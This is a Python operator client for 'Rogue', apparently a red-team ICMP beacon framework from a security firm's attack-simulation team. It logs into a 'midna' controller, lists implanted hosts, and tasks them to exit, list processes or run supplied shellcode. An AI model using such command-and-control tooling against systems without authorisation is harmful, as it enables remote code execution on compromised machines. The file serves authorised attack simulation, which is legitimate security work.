##
## ROGUE
##
## GuidePoint Security LLC
##
## Threat and Attack Simulation Team
##
import sys
import time
import base64
import asyncio
import argparse
import datetime

##
## Library
##
from lib import midna
from lib import logging
from lib import tasking
from lib import websocket

##
## Create argument
##
if __name__ in '__main__':
    opts = argparse.ArgumentParser( description = 'Rogue: minimal ICMP beacon client.' );
    opts.add_argument( '-u', '--username', help = 'Username to use when connecting to midna. ( e.g. username@hostname ) ', required = False, default = 'user@midna.local', type = str );
    opts.add_argument( '-p', '--password', help = 'Password to use when connecting to midna. ( e.g. password ) ', required = False, default = 'password', type = str );
    opts.add_argument( '-i', '--interact', help = 'ID of the agent to interact with.', required = False, default = '', type = str );
    opts.add_argument( '-b', '--block', help = 'Block until the task has been executed.', action = 'store_true', default = False );
    cmds = opts.add_subparsers( help = 'client commands.', dest = 'subcommand', required = True );

    ##
    ## Commands without arguments
    ##
    cmds.add_parser( 'hello', help = 'Tasks the agent to say hello.' );
    cmds.add_parser( 'list', help = 'Prints a list of agents that are connected.' );
    cmds.add_parser( 'exit', help = 'Tasks the agent to exit. Cannot be blocked.' );
    cmds.add_parser( 'logs', help = 'Tasks the client to read the log queue.' );

    ##
    ## Commands with arguments
    ## 
    sopt = cmds.add_parser( 'inline-execute', help = 'Tasks the client to execute an inline command' );
    sopt.add_argument( '-f', '--file', help = 'Path to a shellcode to execute.', type = argparse.FileType( 'rb+' ), required = True );

    sopt = cmds.add_parser( 'process-list', help = 'Tasks the client to print a process list. ( inline-execute )' );
    sopt.add_argument( '-s', '--shellcode', help = 'Path to the process list shellcode.', type = argparse.FileType( 'rb+' ), required = True );
    args = opts.parse_args();

    ##
    ## Connect to midna
    ## 
    try:
        Web = midna.Midna( args.username, args.password );
        Web.get_auth();
    except:
        logging.error( 'could not establish a connection with midna.' );
        raise SystemExit;

    ##
    ## "list"
    ##
    if args.subcommand == 'list':
        ##
        ## Get the list of targets
        ##
        Tgt = Web.get_targets();

        for Client in Tgt:
            ##
            ## Print the list of clients
            ##
            if Client['software_id'] == 4:
                ##
                ## List information about the client
                ##
                logging.success( 'GUID: {} ID: {} NETBIOS: {} Arch: {} Last CheckIn: {}'.format( Client['guid'], Client['implant_id'], Client['machine_name'], Client['architecture'], time.strftime( '%m-%d %H:%M:%S', time.gmtime( Client['time_lastcheckin'] ) ) ) );

    ##
    ## Everything else
    ##
    else:
        ##
        ## Get the target
        ##
        Tgt = Web.get_targets();

        ##
        ## Was a client name providied
        ##
        if args.interact != '':
            ##
            ## Locate the client in the target list.
            ##
            for Client in Tgt:
                ##
                ## Found
                ##
                if Client['implant_id'] == args.interact:
                    ##
                    ## Insert Task: Logs
                    ##
                    if args.subcommand == 'logs':
                        logging.success( 'Listening into the log queue.' );
                        ##
                        ## Print Log info!
                        ##
                        asyncio.run( websocket.ListenForLogs( Client ) ); raise SystemExit

                    ##
                    ## Insert Task: Hello
                    ##
                    if args.subcommand == 'hello':
                        tasking.Task_Hello( Web, Client, args.block, args );

                    ##
                    ## Insert Task: Exit
                    ##
                    if args.subcommand == 'exit':
                        ##
                        ## ExitFree has no buffer
                        ##
                        tasking.Task_ExitFree( Web, Client, args.block, args );

                    ##
                    ## Insert Task: InlineExecute
                    ##
                    if args.subcommand == 'inline-execute':
                        ##
                        ## InlineExecute has arguments
                        ##
                        tasking.Task_InlineExecute( Web, Client, args.block, args );

                    ##
                    ## Insert Task: InlineExecute
                    ##
                    if args.subcommand == 'process-list':
                        ##
                        ## InlineExecute has arguments
                        ##
                        tasking.Task_InlineExecute_ProcessList( Web, Client, args.block, args );

                    ##
                    ## Abort
                    ## 
                    break;
        else:
            logging.error( 'please provide an id to interact with.' );
